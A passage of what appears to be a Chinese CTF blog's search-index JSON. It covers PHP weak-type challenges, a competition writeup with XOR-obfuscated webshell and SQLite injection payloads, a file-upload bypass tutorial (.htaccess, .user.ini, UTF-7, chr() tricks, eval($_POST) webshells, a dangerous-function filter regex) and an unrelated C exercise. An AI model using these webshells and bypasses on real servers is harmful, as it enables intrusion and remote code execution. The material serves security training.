file_get_contents(&#x27;/flag&#x27;);&#125;?&gt; 1&#x2F;?o&#x3D;520a weak_type312345678910111213141516171819202122&lt;?phphighlight_file(__FILE__);function noother_says_correct($number)&#123; $one = ord(&#x27;1&#x27;); $nine = ord(&#x27;9&#x27;); for ($i = 0; $i &lt; strlen($number); $i++) &#123; $digit = ord($number&#123;$i&#125;); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123; return false; &#125; &#125; return $number == &#x27;54975581388&#x27;;&#125;$flag=file_get_contents(&quot;/flag&quot;);if(noother_says_correct($_GET[&#x27;key&#x27;])) echo $flag;else echo &#x27;access denied&#x27;;?&gt; 1&#x2F;?key&#x3D;0xccccccccc weak_type412345678910&lt;?phphighlight_file(__FILE__);if (isset($_POST[&#x27;a&#x27;]) and isset($_POST[&#x27;b&#x27;])) &#123; if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;]) if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) echo file_get_contents(&quot;/flag&quot;); else print &#x27;Wrong.&#x27;;&#125;?&gt; 1a[]&#x3D;1&amp;b[]&#x3D;2 weak_type512345678910111213141516171819&lt;?phpif (isset($_GET[&#x27;username&#x27;]) &amp;&amp; isset($_GET[&#x27;password&#x27;]))&#123; $logined = true; $username = $_GET[&#x27;username&#x27;]; $password = $_GET[&#x27;password&#x27;]; if (!ctype_alpha($username)) &#123;$logined = false;&#125; if (!is_numeric($password) ) &#123;$logined = false;&#125; if (md5($username) != md5($password)) &#123;$logined = false;&#125; if ($logined)&#123; echo &quot;flag&quot;; &#125; else&#123; echo &quot;login failed!&quot;; &#125;&#125;?&gt; isset() 检测变量是否设置 ctype_alpha函数功能就是检测是否是字符 is_numeric 检测变量是否为数字或数字字符串 username必须是字母，password必须是数字，再将传入的username和password进行md5加密后进行比较且结果要相等。 如果md5加密后的值是0e开头，这样就存在弱类型比较问题就可以通过，所以要想得到flag，得寻找纯字母和纯数字md5加密后是0e开头的值。 123&lt;?phpvar_dump(md5(&#x27;QNKCDZO&#x27;) == md5(&#x27;240610708&#x27;));?&gt; bool(true) 1?username&#x3D;QNKCDZO&amp;password&#x3D;240610708 weak_type6123456789&lt;?phphighlight_file(__FILE__);$cmd=$_GET[&#x27;cmd&#x27;];if ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) &#123; echo `$cmd`;&#125; else &#123; echo (&quot;md5 is funny ~&quot;);&#125;?&gt; 尝试使用weak_type4的a[]=1&amp;b[]=2，发现不行，测试后发现数组被强制装换为字符串后都是Array 123456&lt;?php$a = $_POST[&#x27;a&#x27;];$b = $_POST[&#x27;b&#x27;];echo &quot;a=&quot;.(string)$a.&quot;&lt;br&gt;&quot;;echo &quot;b=&quot;.(string)$b;?&gt; a=Array b=Array 参考MD5碰撞后，用burp suite抓包 a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2 天融信面试题12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;html&gt;&lt;body&gt; &lt;form action&#x3D;&quot;index.php&quot; class&#x3D;&quot;authform&quot; method&#x3D;&quot;post&quot; accept-charset&#x3D;&quot;utf-8&quot;&gt; &lt;fieldset&gt; &lt;legend&gt;Unbreakable Random&lt;&#x2F;legend&gt; &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;s&quot; name&#x3D;&quot;s&quot; value&#x3D;&quot;&quot; placeholder&#x3D;&quot;seed&quot; &#x2F;&gt; &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;h&quot; name&#x3D;&quot;h&quot; value&#x3D;&quot;&quot; placeholder&#x3D;&quot;hash&quot; &#x2F;&gt; &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;Check&quot; &#x2F;&gt; &lt;div class&#x3D;&quot;return-value&quot; style&#x3D;&quot;padding: 10px 0&quot;&gt;&amp;nbsp;&lt;&#x2F;div&gt; &lt;&#x2F;fieldset&gt; &lt;&#x2F;form&gt;&lt;?phpfunction gen_secured_random() &#123; &#x2F;&#x2F; cause random is the way $a &#x3D; rand(1337,2600)*42; $b &#x3D; rand(1879,1955)*42; $a &lt; $b ? $a ^&#x3D; $b ^&#x3D; $a ^&#x3D; $b : $a &#x3D; $b; return $a+$b;&#125;function secured_hash_function($plain) &#123; &#x2F;&#x2F; cause md5 is the best hash ever $secured_plain &#x3D; sanitize_user_input($plain); return md5($secured_plain);&#125;function sanitize_user_input($input) &#123; &#x2F;&#x2F; cause someone told me to never trust user input $re &#x3D; &#39;&#x2F;[^a-zA-Z0-9]&#x2F;&#39;; $secured_input &#x3D; preg_replace($re, &quot;&quot;, $input); return $secured_input;&#125;if (isset($_GET[&#39;source&#39;])) &#123; show_source(__FILE__); die();&#125;require_once &quot;secret.php&quot;;if (isset($_POST[&#39;s&#39;]) &amp;&amp; isset($_POST[&#39;h&#39;])) &#123; $s &#x3D; sanitize_user_input($_POST[&#39;s&#39;]); $h &#x3D; secured_hash_function($_POST[&#39;h&#39;]); $r &#x3D; gen_secured_random(); if($s !&#x3D; false &amp;&amp; $h !&#x3D; false) &#123; if($s.$r &#x3D;&#x3D; $h) &#123; print &quot;Well done! Here is your flag: &quot;.$flag; &#125; else &#123; print &quot;Fail...&quot;; &#125; &#125; else &#123; print &quot;&lt;p&gt;Hum ...&lt;&#x2F;p&gt;&quot;; &#125;&#125;?&gt;&lt;p&gt;&lt;em&gt;&lt;a href&#x3D;&quot;index.php?source&quot;&gt;source code&lt;&#x2F;a&gt;&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 其中几个函数的作用 gen_secured_random() 虽然不知道$a ^= $b ^= $a ^= $b的结果会是怎么样的，但$a+$b的值的长度都是六位数 12345678910111213&lt;?phpfor($i = 1; $i &lt; 100; $i++)&#123; $a = rand(1337,2600)*42; $b = rand(1879,1955)*42; $a &lt; $b ? $a ^= $b ^= $a ^= $b : $a = $b; if(strlen($a+$b) != 6)&#123; echo &quot;不是6位数&quot;; break; &#125;&#125;echo &quot;i = &quot;.$i;?&gt; i = 100 sanitize_user_input($input) 对传进来的$input进行过滤，将不是26个字母和数字的字符替换为空 secured_hash_function($plain) 调用sanitize_user_input()函数，对传进来的$plain进行过滤，返回过滤后的md5值 12345678$s = sanitize_user_input($_POST[&#x27;s&#x27;]);$h = secured_hash_function($_POST[&#x27;h&#x27;]);$r = gen_secured_random();if($s != false &amp;&amp; $h != false) &#123; if($s.$r == $h) &#123; print &quot;Well done! Here is your flag: &quot;.$flag; &#125;&#125; 对传进来的$s，过滤掉其它字符，剩下字母和数字 $h也过滤掉后进行md5加密 $r为一个6位数的数 如果$s和$h都不等于false 以及 $s拼接上$r后如果和$h相等的话，就可以得到flag 这里的==存在弱类型比较问题 PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。 1234&lt;?phpvar_dump(&quot;0e123456789&quot; == &quot;0&quot;); //bool(true)var_dump(&quot;0e123456789&quot; === &quot;0&quot;); //bool(false)?&gt; 已知用md5加密s878926199a后的结果是以0e开头的 1234&lt;?php echo md5(&quot;s878926199a&quot;); //0e545993274517709034328855841020?&gt; 所以$h=s878926199a，md5加密后为32位，减去$r的6位后，也就是说$s是以0e开头的26位数 可以是$s=0e111111111111111111111111 即s=0e111111111111111111111111&amp;h=s878926199a 当然可以是这样的 s=0e&amp;h=s878926199a","categories":[{"name":"信息安全","slug":"信息安全","permalink":"https://flag2020.top/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"web","slug":"web","permalink":"https://flag2020.top/tags/web/"}]},{"title":"一道ACM测试赛的题目","slug":"一道ACM测试赛的题目","date":"2020-10-29T11:00:00.000Z","updated":"2020-11-11T15:11:40.522Z","comments":true,"path":"2020/10/29/一道ACM测试赛的题目/","link":"","permalink":"https://flag2020.top/2020/10/29/%E4%B8%80%E9%81%93ACM%E6%B5%8B%E8%AF%95%E8%B5%9B%E7%9A%84%E9%A2%98%E7%9B%AE/","excerpt":"题目：查找缺失的元素 太久没做类似这种题了，一道很简单的题目，竟然用了20多分钟才做出来😥 查找缺失的元素描述：给定一个数组，找出其中的最大值n，输出[0,n]在该数组中缺失的元素。 输入：输入任意个自然数，当输入为-1时，结束输入。 输出：输出缺失的元素，每两个元素之间用空格分隔。","text":"题目：查找缺失的元素 太久没做类似这种题了，一道很简单的题目，竟然用了20多分钟才做出来😥 查找缺失的元素描述：给定一个数组，找出其中的最大值n，输出[0,n]在该数组中缺失的元素。 输入：输入任意个自然数，当输入为-1时，结束输入。 输出：输出缺失的元素，每两个元素之间用空格分隔。 例1： 输入：0 1 4 -1 输出：2 3 例2： 输入：5 8 -1 输出：0 1 2 3 4 6 7 分析① 输入数字，直到输入-1则停止输入 ② 找到数组中的最大值 ③ 输出[0,n]在该数组中缺失的元素 ① 输入数字，直到输入-1则停止输入1234567891011121314#include&lt;stdio.h&gt;int main()&#123; int a[100]; int i = 0; int x; scanf(&quot;%d&quot;, &amp;x); while(x != -1)&#123; a[i++] = x; scanf(&quot;%d&quot;, &amp;x); &#125; return 0;&#125; ② 找到数组中的最大值12345678910111213141516171819202122#include&lt;stdio.h&gt;int main()&#123; int a[100]; int i = 0; int x; scanf(&quot;%d&quot;, &amp;x); while(x != -1)&#123; a[i++] = x; scanf(&quot;%d&quot;, &amp;x); &#125; int max = a[0]; int j; for(j=1; j&lt;i; j++)&#123; if(a[j] &gt; max)&#123; max = a[j]; &#125; &#125; return 0;&#125; ③ 输出[0,n]在该数组中缺失的元素1234567891011121314151617181920212223242526272829303132333435363738394041#include&lt;stdio.h&gt;int main()&#123; int a[100]; int i = 0; int x; scanf(&quot;%d&quot;, &amp;x); while(x != -1)&#123; a[i++] = x; scanf(&quot;%d&quot;, &amp;x); &#125; int max = a[0]; int j; for(j=1; j&lt;i; j++)&#123; if(a[j] &gt; max)&#123; max = a[j]; &#125; &#125; int tag = 0; int k = 0; for(k=0; k&lt;max; k++)&#123; for(j=0; j&lt;i; j++)&#123; if(k == a[j])&#123; tag = 1; break; &#125; &#125; if(tag == 0)&#123; printf(&quot;%d&quot;, k); if(k != max-1)&#123; printf(&quot; &quot;); &#125; &#125;else&#123; tag = 0; &#125; &#125; return 0; &#125;","categories":[{"name":"其它","slug":"其它","permalink":"https://flag2020.top/categories/%E5%85%B6%E5%AE%83/"}],"tags":[{"name":"其它","slug":"其它","permalink":"https://flag2020.top/tags/%E5%85%B6%E5%AE%83/"}]},{"title":"菜鸡划水队 writeup","slug":"菜鸡划水队writeup","date":"2020-10-23T16:00:00.000Z","updated":"2020-11-11T15:38:08.638Z","comments":true,"path":"2020/10/24/菜鸡划水队writeup/","link":"","permalink":"https://flag2020.top/2020/10/24/%E8%8F%9C%E9%B8%A1%E5%88%92%E6%B0%B4%E9%98%9Fwriteup/","excerpt":"比赛：2020全国工业互联网安全技术技能大赛 学生组 正如队名一样，我们只是来划水的签到选手","text":"比赛：2020全国工业互联网安全技术技能大赛 学生组 正如队名一样，我们只是来划水的签到选手 签到拼图，拼完就可以得到flag flag 1flag&#123;welcome_to_chinaiisc2020&#125; SimpleCalculator不知道怎么用这个计算器来计算，查看网页源码，尝试用 ?search 传参 尝试使用异或绕过 12345&lt;?php$a = urldecode(&#x27;%ff%ff%ff%ff&#x27;);$b = urldecode(&#x27;%a0%b8%ba%ab&#x27;);echo $a^$b;//输出_GET 构造phpinfo() 123$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo//$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo 构造webshell 123$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[%ff]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[%a0]);&amp;%ff=assert&amp;%a0=eval($_POST[%27cmd%27])//$&#123;_GET&#125;[assert]($&#123;_GET&#125;[eval($_POST[%27cmd%27])]); 使用蚁剑查看 http://eci-2ze7n0wiyptutv9upaxm.cloudeci1.ichunqiu.com/flag.php?search=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[%ff]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[%a0]);&amp;%ff=assert&amp;%a0=eval($_POST[%27cmd%27]) 在网站根目录下找到flag flag 1flag&#123;08768680-a69a-42f1-b515-4220cf7e9a0d&#125; 其它方法： 123?search=$&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;&#123;%ff&#125;($&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;&#123;%a0&#125;);&amp;%ff=system&amp;%a0=cat%20/flag//?search=$&#123;_GET&#125;&#123;system&#125;($&#123;_GET&#125;&#123;cat /flag&#125;); SQLManager参考文章：https://www.anquanke.com/post/id/200927#h3-6 题目说这是个简易的SQLite管理器。 而SQLite管理器有一个自动创建的库sqlite_master，里面保存了所有表名以及创建表时的create语句。在创建表时可以用as来复制另一个表中的数据，所以我们可以从中获取到flag的表名和字段名。 在建表界面用burp suite抓包，重放包得到flag的表名和字段名 table_name=a as select sql as[&amp;columns[0][name]=]from sqlite_master;&amp;columns[0][type]=INTEGER 这里可以得知flag所在的表：flag_Y0U_c4nt_GUESS，以及所在的字段：flag_ThE_C0lumn 删表后再次抓包，表名为 b ，继续用burp suite重放包 将a改为b，sql改为flag_Y0U_c4nt_GUESS，将sqlite_master改为flag_ThE_C0lumn table_name=b as select [flag_ThE_C0lumn] as[&amp;columns[0][name]=]from flag_Y0U_c4nt_GUESS;&amp;columns[0][type]=INTEGER flag 1flag&#123;486756b1-d23c-4236-b44c-cd43640098c6&#125;","categories":[{"name":"比赛writeup","slug":"比赛writeup","permalink":"https://flag2020.top/categories/%E6%AF%94%E8%B5%9Bwriteup/"}],"tags":[{"name":"writeup","slug":"writeup","permalink":"https://flag2020.top/tags/writeup/"}]},{"title":"文件上传漏洞","slug":"文件上传漏洞","date":"2020-10-16T16:00:00.000Z","updated":"2020-11-11T15:20:55.263Z","comments":true,"path":"2020/10/17/文件上传漏洞/","link":"","permalink":"https://flag2020.top/2020/10/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","excerpt":"一些web应用程序中允许上传图片，文本或者其他资源到指定的位置，文件上传漏洞就是利用这些可以上传的地方将恶意代码植入到服务器中，再通过url去访问以执行代码。 通常造成文件上传漏洞的原因是：对于上传文件的后缀名（扩展名），类型，以及内容没有做好严格的限制等等一些原因。 文件上传漏洞是指由于程序员未对上传的文件进行严格的验证和过滤，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。 这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。","text":"一些web应用程序中允许上传图片，文本或者其他资源到指定的位置，文件上传漏洞就是利用这些可以上传的地方将恶意代码植入到服务器中，再通过url去访问以执行代码。 通常造成文件上传漏洞的原因是：对于上传文件的后缀名（扩展名），类型，以及内容没有做好严格的限制等等一些原因。 文件上传漏洞是指由于程序员未对上传的文件进行严格的验证和过滤，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。 这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。 文件上传漏洞.htaccess任意文件解析 .htaccess可以帮我们实现：网页301重定向，自定义404错误页面，改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、封禁特定IP地址的用户，只允许特定IP地址的用户，以及使用其他文件作为index文件配置默认文档等功能。 当服务器是上传使用的是黑名单机制，但是锁死了不给上传php后缀的文件，我们可以使用.htaccess文件重新配置当前文件的解析后缀为其他后缀绕过导致其他后缀的文件被解析为php。导致远程代码执行。 1AddType application&#x2F;x-httpd-php .aaa .htaccess文件配置信息,这里将后缀为.aaa的文件均解析为php文件 短标签绕过假设&lt;?php 被被过滤，同时PHP版本为5可以使用段标签绕过。 JS风格 1&lt;script language=&quot;php&quot;&gt;phpinfo();&lt;/script&gt; 短标签风格 1&lt;?=phpinfo();?&gt; &lt;?=?&gt;与&lt;?php echo ....?&gt;等效 ASP风格 1&lt;% phpinfo();%&gt; 官方默认风格 1&lt;?php phpinfo(); ?&gt; 特殊编码绕过(UTF-7)如果程序过滤了所有标签形式、或者说过滤了&lt;?而且PHP是在PHP7以上版本（PHP7已经将其他标签形式过淘汰，仅剩下&lt;?php形式），这时候可以使用.htaccess解码对应的文件，例如可以使用UTF-7进行解码：(https://www.novel.tools/encode/UTF-7这个网站可以编码和解码UTF-7） .htaccess 1234AddType application&#x2F;x-httpd-php .aaaphp_flag display_errors onphp_flag zend.multibyte 1php_value zend.script_encoding &quot;UTF-7&quot; 1.aaa 1+ADw?php +AEA-eval(+ACQAXw-POST+AFs&#39;cmd&#39;+AF0)+ADs?+AD4- 双写绕过假如对上传文件的内容中的php，POST，eval替换为空，那么我们可以用这样的方式绕过。 12&lt;?pphphp@eevalval($_PPOSTOST[&#x27;cmd&#x27;]); 123&lt;?php@eval($_POST[&#x27;cmd&#x27;]); .user.ini绕过假如.htaccess被过滤了，不允许上传，而上传目录下有一个php文件，则可以使用.user.ini将我们制定文件包含到我们目录下的所有PHP文件导致远程代码执行。 1.aaa 12&lt;?php@eval($_POST[&#x27;cmd&#x27;]); .user.ini 1auto_prepend_file&#x3D;1.aaa 加载其它php文件的时候，会先加载.user.ini里的1.aaa .htaccess文件换行绕过上传.htaccess文件时候发现文件内容被过滤。可以使用换行绕过的方法绕过过滤。 .htaccess支持换行编写所以使用换行可以直接上传成功并解析。 12AddType appli\\cation&#x2F;x-httpd-php .aaa 过滤掉application，则使用换行绕过 文件包含解码Base64 .htaccess 12AddType application&#x2F;x-httpd-php .aaaphp_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;shell.aaa&quot; 动态拼接函数绕过函数过滤对危险函数进行了过滤，不允许上传，则可以使用aiisc码拼接动态构造函数来绕过。 使用脚本快速生成指定函数 123456&lt;?php$a = &quot;phpinfo&quot;;for($i=0;$i&lt;strlen($a);$i++)&#123; echo &quot;chr(&quot;.ord($a[$i]).&quot;).&quot;;&#125;?&gt; chr(112).chr(104).chr(112).chr(105).chr(110).chr(102).chr(111) 1.aaa 1234&lt;?php$a &#x3D; chr(112).chr(104).chr(112).chr(105).chr(110).chr(102).chr(111);$a();?&gt; 图片头绕过上传1.aaa，被检测到文件不是图片类型，则可以通过以下方法绕过，则有可能被识别为图片，绕过检测。 XMB文件头绕过12#define test_width 16#define test_height 7 1.aaa 123456#define test_width 16#define test_height 7&lt;?php$a &#x3D; chr(112).chr(104).chr(112).chr(105).chr(110).chr(102).chr(111);$a();?&gt; GIF89a1GIF89a 1.aaa 12345GIF89a&lt;?php$a &#x3D; chr(112).chr(104).chr(112).chr(105).chr(110).chr(102).chr(111);$a();?&gt; 题目upload2发现不能上传php文件，且文件内容不能使用官方默认风格(上传提示：Can’t upload php file)，所以尝试使用其它标签绕过 .htaccess 1AddType application&#x2F;x-httpd-php .aaa 1.aaa 1&lt;script language&#x3D;&quot;php&quot;&gt;@eval($_POST[&#39;cmd&#39;]);&lt;&#x2F;script&gt; 在根目录下找到flag。 或者 cat /flag upload3 .htaccess 1AddType application&#x2F;x-httpd-php .aaa 1.aaa 12&lt;?php@eval($_POST[&#39;cmd&#39;]); 发现php，eval，POST被替换为空，使用双写绕过。 .htaccess 1AddType application&#x2F;x-httpd-pphphp .aaa 1.aaa 12&lt;?pphphp@eevalval($_PPOSTOST[&#39;cmd&#39;]); upload4 .htaccess 1AddType application&#x2F;x-httpd-php .aaa 1.aaa 12&lt;?php@eval($_POST[&#39;cmd&#39;]); 发现没有上传。上传test.php和1.jpg（不是真的jpg文件）也都失败，尝试使用.user.ini绕过，结果提示：内容不能有file。 几次尝试后发现，它对文件内容进行检查，不能含有&lt;?，且无法用其它标签绕过。 尝试使用特殊编码绕过，上传.htaccess和1.aaa .htaccess 1234AddType application&#x2F;x-httpd-php .aaaphp_flag display_errors onphp_flag zend.multibyte 1php_value zend.script_encoding &quot;UTF-7&quot; 1.aaa 1+ADw?php +AEA-eval(+ACQAXw-POST+AFs&#39;cmd&#39;+AF0)+ADs?+AD4- 在根目录下找到flag。 找到flag之后查看php版本为：7.0.33 尝试发现： 由于版本为7.0以上且过滤掉&lt;?，所以无法使用其它标签绕过。 upload6 .htaccess 1AddType application&#x2F;x-httpd-php .aaa 提示：内容不能有application 尝试使用.htaccess文件换行绕过。 .htaccess 12AddType appli\\cation&#x2F;x-httpd-php .aaa 1.aaa 12&lt;?php@eval($_POST[&#39;cmd&#39;]); upload7 .htaccess 1AddType application&#x2F;x-httpd-php .aaa 1.aaa 12&lt;?php@eval($_POST[&#39;cmd&#39;]); 上传1.aaa 提示：不能含有危险函数！ 使用burp suite抓包看看，发现eval和POST被过滤了。 尝试使用动态拼接函数绕过函数过滤，发现可以成功上传，然后访问该文件就可以得到flag。 1.aaa 123&lt;?php$a &#x3D; chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);$a(&#39;cat &#x2F;flag&#39;); 123&lt;?php$a = chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);echo $a; 输出：system PS： ctf-wscan下载地址：https://codeload.github.com/kingkaki/ctf-wscan/zip/master 做题前可以先扫扫看有没有备份文件 像robots.txt 、www.zip。 使用扫描器扫描发现存在备份文件 下载备份文件 把.index.php.swp放到linux下使用vim -r恢复 1vim -r index.php.swp 得到源代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;?php//设置上传目录define(&quot;UPLOAD_PATH&quot;, &quot;../upload&quot;);function deldot($s)&#123; for($i=strlen($s)-1;$i&gt;0;$i--)&#123; $c=substr($s,$i,1); if($i == strlen($s)-1 and $c != &#x27;.&#x27;)&#123; return $s; &#125; if($c != &#x27;.&#x27;)&#123; return substr($s,0,$i+1); &#125; &#125;&#125;$is_upload=false;$msg=null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext=array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;); $file_name=trim($_FILES[&#x27;pic&#x27;][&#x27;name&#x27;]); $file_name=deldot($file_name);//删除文件名末尾的点 $file_ext=strrchr($file_name, &#x27;.&#x27;); $file_ext=strtolower($file_ext); //转换为小写 $file_ext=str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext=trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file=$_FILES[&#x27;pic&#x27;][&#x27;tmp_name&#x27;]; $img_path=UPLOAD_PATH.&#x27;/&#x27;.$file_name; if(preg_match(&quot;/(phpinfo|system\\(|eval\\(|file_put_contents|file_get_contents|passthru|exec\\(|chroot|scandir|proc_open|delfolder|unlink|mkdir|fopen|fread|fwrite|fputs|tmpfile|flock|chmod|delete|assert|_post|_get|_request|_file|create_function|array_walk|preg_replace|cookie)/Ui&quot;,file_get_contents($temp_file)))&#123; die(&quot;不能含有危险函数！&quot;); &#125; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload=true; echo &quot;上传成功&quot;.&quot;&lt;br&gt;&quot;; echo $img_path; &#125;else&#123; echo &#x27;上传出错！&#x27;; &#125; &#125;else&#123; echo &#x27;此文件不允许上传!&#x27;; &#125; &#125;else&#123; echo UPLOAD_PATH . &#x27;文件夹不存在,请重新上传！&#x27;; mkdir(UPLOAD_PATH,775,true); &#125;&#125;?&gt;","categories":[{"name":"信息安全","slug":"信息安全","permalink":"https://flag2020.top/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"web","slug":"web","permalink":"https://flag2020.top/tags/web/"}]},{"title":"反序列化漏洞","slug":"反序列化漏洞","date":"2020-10-07T16:00:00.000Z","updated":"2020-11-11T15:23:22.458Z","comments":true,"path":"2020/10/08/反序列化漏洞/","link":"","permalink":"https://flag2020.top/2020/10/08/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","excerpt":"所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。unserialize()函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。 序列化 serialize() 将对象转变成一个字符串便于之后的传递与使用。 序列化会保存对象所有的变量，但是不会保存对象的方法。 反序列化 unserialize() 将序列化的结果恢复成对象。 反序列化一个对象，这个对象的类必须在反序列化之前定义，或者通过包含该类的定义或者使用 spl_autoload_register() (自动包含类)实现","text":"所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。unserialize()函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。 序列化 serialize() 将对象转变成一个字符串便于之后的传递与使用。 序列化会保存对象所有的变量，但是不会保存对象的方法。 反序列化 unserialize() 将序列化的结果恢复成对象。 反序列化一个对象，这个对象的类必须在反序列化之前定义，或者通过包含该类的定义或者使用 spl_autoload_register() (自动包含类)实现 反序列化漏洞序列化和反序列化本身没有问题，但是如果反序列化的内容是用户可以控制的，且后台不正当的使用了PHP中的魔法函数，就会导致安全问题。 php魔术方法 PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法。 通常来说有一些PHP的魔法函数会导致反序列化漏洞，如： __construct 当一个对象创建时自动调用 __wakeup 使用unserialize()函数时会自动调用 __destruct 当对象被销毁时自动调用 (php绝大多数情况下会自动调用销毁对象) __toString 当一个对象被当作一个字符串被调用。 __sleep() 使用serialize()函数时触发 __call() 在对象上下文中调用不可访问的方法时触发 __callStatic() 在静态上下文中调用不可访问的方法时触发 __get() 用于从不可访问的属性读取数据 __set() 用于将数据写入不可访问的属性 __isset() 在不可访问的属性上调用isset()或empty()触发 __unset() 在不可访问的属性上使用unset()时触发 __toString() 把类当作字符串使用时触发,返回值需要为字符串 __invoke() 当脚本尝试将对象调用为函数时触发 12345678910111213141516171819202122232425262728293031&lt;?phpclass test &#123; public $varr1 = &quot;abc&quot;; public $varr2 = &quot;123&quot;; public function echoP() &#123; echo $this-&gt;varr1.&quot;&lt;br&gt;&quot;; &#125; public function __construct() &#123; echo &quot;__construct&lt;br&gt;&quot;; &#125; public function __destruct() &#123; echo &quot;__destruct&lt;br&gt;&quot;; &#125; public function __toString() &#123; return &quot;__toString&lt;br&gt;&quot;; &#125; public function __sleep() &#123; echo &quot;__sleep&lt;br&gt;&quot;; return array(&#x27;varr1&#x27;,&#x27;varr2&#x27;); &#125; public function __wakeup() &#123; echo&quot;__wakeup&lt;br&gt;&quot;; &#125;&#125;$obj = new test();//序列化对象，调用__construct()方法，输出__construct$obj-&gt;echoP(); //调用echoP()方法，输出&quot;abc&quot;echo $obj; //obj对象被当做字符串输出，调用__toString()方法，输出__toString$s = serialize($obj); //obj对象被序列化，调用__sleep()方法，输出__sleepecho unserialize($s); //$s首先会被反序列化，会调用__wakeup()方法，被反序列化出来的对象又被当做字符串，就会调用_toString()方法。 //脚本结束销毁对象（$obj和反序列化的$s）时，又会调用__destruct()方法（两次），输出__destruct（两次）?&gt; 反序列化漏洞例子： 12345678910&lt;?phpclass A&#123; var $test = &quot;kawhi&quot;; function __wakeup()&#123; echo $this-&gt;test; &#125;&#125;$a = $_GET[&#x27;a&#x27;];$b = 